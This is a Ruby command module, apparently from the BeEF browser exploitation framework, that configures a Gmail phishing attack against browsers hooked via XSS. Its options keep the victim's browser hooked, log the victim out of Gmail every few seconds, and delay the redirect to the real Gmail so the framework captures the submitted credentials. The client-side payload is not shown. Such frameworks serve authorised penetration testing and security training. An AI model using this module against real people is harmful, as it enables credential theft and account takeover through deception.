#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Gmail_phishing < BeEF::Core::Command

  def self.options
     configuration = BeEF::Core::Configuration.instance

     xss_hook_url = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/basic.html"
     logout_gmail_interval = 10000
     wait_seconds_before_redirect = 1000
     return [
        {'name' => 'xss_hook_url', 
         'description' => 'The URI including the XSS to hook a browser. If the XSS is not exploitable via an URI, simply leave this field empty, but this means you will loose the hooked browser after executing this module.',
         'ui_label' => 'XSS hook URI',
         'value' => xss_hook_url,
         'width' => '300px' }, {
         'name' => 'logout_gmail_interval', 
         'description' => 'The victim is continuously loged out of Gmail. This is the interval in ms.',
         'ui_label' => 'Ms Gmail logout interval',
         'value' => logout_gmail_interval,
         'width' => '100px' }, {
         'name' => 'wait_seconds_before_redirect', 
         'description' => 'When the user submits his credentials on the phishing page, we have to wait (in ms) before we redirect to the real Gmail page, so that BeeF gets the credentials in time.',
         'ui_label' => 'Ms before redirecting',
         'value' => wait_seconds_before_redirect,
         'width' => '100px' }
         ]
   end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content

  end

end
